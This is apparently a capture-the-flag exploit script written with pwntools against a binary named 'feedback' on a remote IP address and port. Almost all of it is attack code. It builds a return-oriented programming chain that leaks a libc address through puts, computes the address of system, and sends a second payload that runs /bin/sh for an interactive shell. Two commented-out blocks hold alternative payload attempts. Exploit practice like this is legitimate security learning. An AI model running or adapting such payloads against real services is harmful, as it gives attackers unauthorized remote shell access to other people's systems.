from pwn import *

#r = process("./feedback")
#gdb.attach(r)

puts_got = 0x0000000000403fb8
puts = 0x4010a0
pop_rdi_ret = 0x00000000004015d3
ret = 0x000000000040101a
bss = 0x00404b00
bss2 = 0x00404a00
bss3 = 0x00404900
bss4 = 0x00404800
scanf = 0x401100
scanf_arg = 0x402172
#scanf_arg = 0x40300e
leave_ret = 0x00000000004012e2
pop_rsi_r15_ret = 0x00000000004015d1
main_ = 0x0000000000401460
yes = 0x4021c2   # "1. Yes"
printf_got = 0x000000000403fc0
printf = 0x4010b0
alarm = 0x4010c0
pop_rbp_ret = 0x00000000004011dd

for _ in range(32):
	r = remote("45.122.249.68", 10008)
	#r = process("./feedback")
	#gdb.attach(r)
	r.recvuntil(b'our name:')
	
	payload1 = b'a'*(0x40-1)
	r.sendline(b'any')
	r.recvuntil(b'You choice:')
	
	r.sendline(b'4')
	r.recvuntil(b'our feedback:')
	
	payload2 = p64(bss)
	payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)   # leak
	payload2 += p64(pop_rdi_ret) + p64(scanf_arg)
	payload2 += p64(pop_rsi_r15_ret) + p64(bss) + p64(0) 
	payload2 += p64(0x0000000000401454)

	r.send(payload2)   # from nah

	try:
		stuff = r.recvuntil(b'\x7f')
	except:
		try:
			r.close()
		except:
			continue
		continue

	stuff = stuff[-6:]
	libc_base = int.from_bytes(stuff, "little") - 0x00000000000875a0
	print("libc_base: " + hex(libc_base))
	system = libc_base + 0x000000000055410
	print("system: " + hex(system))

	#gdb.attach(r)

	payload3 = p64(bss2) + p64(pop_rdi_ret) + p64(bss + 5*8) + p64(ret) + p64(system)
	payload3 += b'/bin/sh\x00'

	r.sendline(payload3)

	r.interactive()

'''
	#payload3 = p64(bss2)
	payload3 = p64(pop_rdi_ret) + p64(scanf_arg)
	payload3 += p64(pop_rsi_r15_ret) + p64(bss2) + p64(0) 
	payload3 += p64(ret) + p64(scanf)
	payload3 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)
	#payload3 += p64(pop_rbp_ret) + p64(bss2)
	#payload3 += p64(leave_ret)
	#payload3 += b"%200s\x00\x00\x00"  # bss + 9*8

	try:
		r.send(payload3)
		r.sendline(b'\x01'*80)
		print(r.recvuntil(b'\x7f'))
	except:
		try:
			r.close()
		except:
			continue
		continue


	payload4 = p64(bss3)
	payload4 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)
	payload4 += p64(0)*6

	try:
		r.sendline(payload4)
		print(r.recvuntil(b'\x7f'))
	except:
		try:
			r.close()
		except:
			continue
		continue
	r.interactive()
'''

'''
	payload3 = p64(bss3)
	payload3 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)  # leak lib
	payload3 += p64(pop_rdi_ret) + p64(0x402172)
	payload3 += p64(pop_rsi_r15_ret) + p64(bss2) + p64(0)
	payload3 += p64(ret) + p64(scanf)
	payload3 += p64(pop_rdi_ret) + p64(bss2)
	payload3 += p64(puts)

	payload3 += p64(pop_rsi_r15_ret) + p64(bss3) + p64(0)
	payload3 += p64(ret) + p64(scanf)

	payload3 += p64(pop_rdi_ret) + p64(bss3)
	payload3 += p64(puts)

	
	#payload3 += p64(leave_ret)

	try:
		r.sendline(payload3)
		r.sendline(b'abcdef')
		stuff = r.recvuntil(b'\x7f')
	except:
		try:
			r.close()
		except:
			continue
		continue


	stuff = stuff[-6:]
	libc_base = int.from_bytes(stuff, "little") - 0x00000000000875a0
	print("libc_base: " + hex(libc_base))
	system = libc_base + 0x000000000055410
	print("system: " + hex(system))


	#payload = p64(bss) + p64(pop_rdi_ret) + p64(bss2 + 4*8)
	#payload += p64(system) + b"/bin/sh\x00"

	payload = p64(bss) + p64(pop_rdi_ret) + p64(yes)
	payload += p64(puts)

	r.sendline(b"123456")

	#r.sendline(payload)
	
	r.interactive()

'''